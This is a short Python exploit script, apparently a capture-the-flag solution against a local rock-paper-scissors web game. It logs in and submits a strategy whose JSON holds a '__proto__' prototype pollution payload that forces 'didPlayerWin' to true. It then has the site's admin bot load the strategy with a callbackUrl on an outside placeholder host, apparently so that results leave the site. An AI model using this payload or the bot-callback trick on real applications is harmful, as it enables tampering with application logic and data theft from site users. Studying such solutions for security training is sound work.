import requests
import json

with requests.session() as sess:
    data = {'username': 'test', 'password': 'test'}
    header = {'Content-Type': 'text/plain;charset=UTF-8'}
    domain = 'http://127.0.0.1:34343'
    r = sess.post(f'{domain}/user/signin',
                  data=json.dumps(data), headers=header)

    pp_exploit = {"name": "Exploit2", "strategy": [{"move": "rock", "id": 0, "__proto__": {"didPlayerWin": True}, "if": {"onWin": {"id": 1, "move": ""}, "onLose": {"id": 2, "move": "paper", "if": {"onWin": {"id": 12, "move": ""}, "onLose": {"id": 13, "move": ""}, "onDraw": {"id": 14, "move": ""}}}, "onDraw": {"id": 3, "move": ""}}}]}
    r = sess.post(f'{domain}/game/strategy',
              data=json.dumps(pp_exploit), headers=header)

    str_id = json.loads(r.text)['_id']
    send_data = {'url': f'/game/play-strategy?strategy_id={str_id}&callbackUrl=https://xxxxxxxxx/'}
    send_to_bot = sess.post(f'{domain}/bot', data=json.dumps(send_data), headers=header)
